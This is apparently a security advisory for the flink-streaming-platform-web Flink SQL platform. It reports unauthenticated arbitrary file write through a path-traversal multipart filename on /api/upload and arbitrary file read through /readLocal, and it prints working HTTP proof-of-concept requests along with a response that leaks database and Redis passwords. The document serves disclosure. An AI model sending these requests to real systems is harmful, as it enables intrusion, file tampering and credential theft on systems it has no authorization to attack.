# flink-streaming-platform-web Arbitrary File Write and Read Vulnerability Report

## Vulnerability Description

flink-streaming-platform-web (zhp2019/flink-streaming-platform-web, an open-source Flink SQL submission platform on Gitee) in its latest version: the upload endpoint `/api/upload` concatenates the multipart filename `originalFilename` **unfiltered into `new File(uploadPath + originalFilename)`** and writes it to disk → arbitrary file write (path traversal). The read endpoint `/readLocal/{fileName}` does `new File(getSqlHome()+fileName)` with **no directory containment check** → arbitrary file read (LFI). Both endpoints are **reachable with zero credentials**: the read endpoint is in the anonymous whitelist, and the write endpoint's login check only applies to requests carrying the `X-Requested-With: XMLHttpRequest` header and can be bypassed, requiring no session cookie.

## Affected Versions

flink-streaming-platform-web ≤ 1.5.0 (including the 2022 version)

## Exploitation Conditions

- Exposed `/api/upload`, `/readLocal/*` — no login required

## Reproduction

Home page:

![image-20260820215351038](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260820215351038.4jou4kbwfq.webp)

**1. Arbitrary File Write (Unauthenticated)**

```http
POST /api/upload HTTP/1.1
Host: 127.0.0.1:8180
Content-Type: multipart/form-data; boundary=----B
Connection: close

------B
Content-Disposition: form-data; name="file"; filename="../../pwned.txt"
Content-Type: application/octet-stream

PAYLOAD
------B--
```

![image-20260820215316000](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260820215316000.8adzpt1830.webp)

`filename="../../pwned.txt"` sits in the multipart filename header and does not go through URL normalization, escaping the `upload_jars` sandbox. Response `HTTP/1.1 200 {"code":"200","success":true}`, and the file lands in the webapp document root.

**3. Arbitrary File Read — Real Echo of Sensitive Configuration (Unauthenticated)**

```http
GET /readLocal/app_runtime.properties HTTP/1.1
Host: 127.0.0.1:8180
```

```http
HTTP/1.1 200
Content-Disposition: attachment; filename=app_runtime.properties
Content-Length: 204

spring.datasource.url=jdbc:mysql://127.0.0.1:3306/flink_web
spring.datasource.username=root
spring.datasource.password=Flink@RealDB#2026      ← DB Password
spring.redis.host=10.0.0.9
spring.redis.password=Flink@RedisSecret            ← Redis Password
```

![image-20260820215250292](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260820215250292.1764a6w6ay.webp)

`sqlPath = HOME + "sql/" + fileName`; all files under the read endpoint's base directory (including SQL jobs and config) can be echoed back anonymously.

Code:

![image-20260820215636676](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260820215636676.7axwcmz5di.webp)

![image-20260820215718220](https://github.com/fangtang7/picx-images-hosting/raw/master/fink/image-20260820215718220.5flbk0n208.webp)
